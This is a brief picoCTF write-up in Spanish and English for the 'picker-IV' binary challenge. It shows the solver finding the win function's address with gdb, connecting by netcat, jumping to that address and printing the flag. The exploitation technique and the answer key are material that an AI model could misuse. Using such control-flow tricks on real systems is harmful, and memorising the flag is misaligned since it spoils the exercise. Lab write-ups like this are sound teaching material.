
 
#### Description

Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 57816`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/529/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/529/picker-IV).


## Pistas

With Python, there are no binaries. With compiled languages like C, there is source code, and there are binaries. Binaries are created from source code, they are a conversion from the human-readable source code, to the highly efficient machine language, in this case: x86_64.

## Solución

``` al entrar en el archivo con gdb buscamos la direccion con win que es la 0x40129e
┌──(kali㉿kali)-[~/hacking/ALA]
└─$ nc saturn.picoctf.net 57816
Enter the address in hex to jump to, excluding '0x': 0x40129e    
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}



```

## Bandera
Flag: picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}


## Notas adicionales


## Referencias
